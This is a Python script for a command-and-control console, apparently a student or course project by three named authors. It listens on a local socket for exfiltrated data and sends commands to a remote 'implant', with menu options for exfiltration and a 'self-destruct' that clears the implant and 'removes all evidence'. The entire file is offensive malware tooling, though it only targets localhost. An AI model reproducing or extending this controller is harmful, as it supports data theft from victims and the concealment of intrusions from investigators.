import colorama
from colorama import Fore, Back, Style
import socket
import sys

# Create a TCP/IP socket
c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('localhost', 9999)
c2_socket.bind(server_address)

colorama.init(autoreset=True)

print('########################################################')
print('##                                                    ##')
print('##           COMMAND AND CONTROL PROGRAM              ##')
print('##   Yefim Shneyderman, Anthony Rinaldi, Brendon Ky   ##')
print('##                                                    ##')
print('########################################################')

def recieve_exfil():
    # Wait for a connection
    print("waiting for a connection")
    connection, client_address = c2_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            data = connection.recv(100)
            if data:
                print(data)
            else:
                print("----------------")
                break
            
    finally:
        # Clean up the connection
        connection.close()

def send_implant(comm):
    #Send comm command to victim
    implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    implant_server_address = ('localhost', 10000)
    implant_socket.connect(implant_server_address)
    implant_socket.sendall(str.encode(comm))
    implant_socket.close()

while(True):
    print("Options:")
    print("1. Self-destruct (clears implant and removes all evidence)")
    print("2. Exfil")
    print("3. Exit")
    print(f"{Fore.CYAN}What would you like to do:")
    choice = input(">>")
    if choice == '1':
        print(f"{Fore.RED}Self-destruct initiated")
        send_implant('1')
        print(f"{Fore.RED}Self-destruct complete")
        exit()

    elif choice == '2':
        print("Exfil initiated")
        
        #Listen for the Responses
        c2_socket.listen(1)
        exfil = True
        while(exfil == True):
            #Send command to exfiltrate
            send_implant('2')
            #Recieve the exfil
            recieve_exfil()
            print("Press n to end: any other key to continue")
            c = input(">>")
            if(c == 'n'):
                break
            
    elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
        print("Exiting the C2 instance")
        print("Implant is still running - Connect to it again later")
        exit()

    else:
        print("Unrecognized input")

        
    